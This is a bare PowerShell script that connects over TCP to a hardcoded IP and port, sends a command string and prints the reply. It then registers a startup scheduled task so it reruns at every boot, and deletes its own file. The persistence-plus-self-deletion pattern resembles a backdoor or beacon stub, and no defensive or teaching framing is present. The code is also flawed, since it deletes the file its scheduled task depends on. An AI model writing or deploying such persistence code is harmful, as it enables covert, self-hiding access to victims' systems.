# TCP Connection Setup

$serverIp = "192.168.0.193"
$port = 5555  # Use the appropriate port number

# Create a TCP client socket
$client = New-Object System.Net.Sockets.TcpClient

# Connect to the server
$client.Connect($serverIp, $port)

# Get a network stream object associated with the client
$stream = $client.GetStream()

# Create a StreamWriter object for writing data to the network stream
$writer = New-Object System.IO.StreamWriter($stream)

# Example command to send to the server
$command = "Get-Process"
$writer.WriteLine($command)
$writer.Flush()  # Flush the buffer to ensure the data is sent immediately

# Read the response from the server
$reader = New-Object System.IO.StreamReader($stream)
$response = $reader.ReadToEnd()

# Close the connection
$client.Close()

# Print the response received from the server
$response

# Register a scheduled task to run this script at system startup

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File '$($MyInvocation.MyCommand.Path)'"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "PersistentConnectionTask" -Description "Runs the Persistent Connection script at system startup."

# Delete this script file
Remove-Item -Path $MyInvocation.MyCommand.Path -Force
